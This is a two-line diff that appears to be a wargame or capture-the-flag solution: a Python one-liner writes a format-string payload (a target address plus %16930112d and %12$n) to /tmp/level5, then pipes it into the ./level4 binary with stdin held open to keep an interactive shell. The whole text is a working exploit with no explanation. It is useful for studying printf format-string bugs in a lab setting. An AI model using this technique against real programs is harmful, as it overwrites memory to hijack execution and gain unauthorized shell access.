@@ -1,0 +1,2 @@
+python -c "print '\x10\x98\x04\x08%4\$16930112d'+'%12\$n'" > /tmp/level5
+cat /tmp/level5 - | ./level4
